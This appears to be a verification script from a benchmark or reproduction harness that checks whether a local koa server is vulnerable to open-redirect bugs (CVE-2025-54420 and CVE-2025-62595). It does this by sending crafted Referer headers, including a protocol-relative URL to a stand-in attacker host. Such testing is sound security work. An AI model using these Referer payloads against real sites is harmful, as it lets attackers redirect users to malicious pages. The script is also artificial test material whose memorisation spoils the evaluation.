#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0=Location contains the run flag  10=blocked/no flag  20=env  30=args
#
# Effect channel = 302 Location from real koa ctx.response.back('/').
# Flag is only the attacker-URL path label; nothing is planted server-side.
# Probe uses RUN_FLAG; judge uses RUN_FLAG_REF so wrong/stale overrides fail.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
JUDGE="${RUN_FLAG_REF:-$RUN_FLAG}"
mkdir -p "$WORK_DIR"
export CASE_DIR RUN_FLAG

if [[ "$MODE" == "--seed" ]]; then
  # CVE-2025-54420: absolute Referer. koa 3.0.0 redirects it; 3.0.1 origin-checks it.
  REFERER="$("$PY" -c "
import importlib.util, os
p = os.path.join(os.environ['CASE_DIR'], 'poc', 'original_poc.py')
spec = importlib.util.spec_from_file_location('original_poc', p)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
print(mod.candidate(os.environ['RUN_FLAG'])['referer'])
")"
  [[ -n "$REFERER" ]] || { echo "verify: seed candidate empty" >&2; exit 20; }
else
  # CVE-2025-62595: protocol-relative Referer startsWith('/') so V1 skips origin check.
  REFERER="//attacker.pcb/${RUN_FLAG}"
fi

PORT=""
for _ in $(seq 1 30); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    port "$VERSION" 3000 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -n "$PORT" ]]; then
    code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 "http://127.0.0.1:${PORT}/" || true)"
    if [[ "$code" == "200" ]]; then
      break
    fi
  fi
  sleep 1
  PORT=""
done
[[ -n "$PORT" ]] || { echo "verify: no published $VERSION:3000" >&2; exit 20; }

HDRS="$(curl -sS -m 12 -D - -o /dev/null -H "Referer: ${REFERER}" \
  "http://127.0.0.1:${PORT}/redirect")" || { echo "verify: curl failed" >&2; exit 20; }
PARSED="$("$PY" -c "
import sys
raw = sys.argv[1]
lines = [ln.rstrip('\r') for ln in raw.splitlines()]
status = lines[0] if lines else ''
loc = ''
for line in lines:
    if line.lower().startswith('location:'):
        loc = line.split(':', 1)[1].strip()
        break
print(status)
print(loc)
" "$HDRS")"
STATUS="$(printf '%s\n' "$PARSED" | sed -n '1p')"
LOC="$(printf '%s\n' "$PARSED" | sed -n '2p')"
echo "mode=${MODE#--} status=${STATUS} location=${LOC:0:240}"
if [[ -n "$JUDGE" && "$LOC" == *"$JUDGE"* ]]; then
  exit 0
fi
exit 10
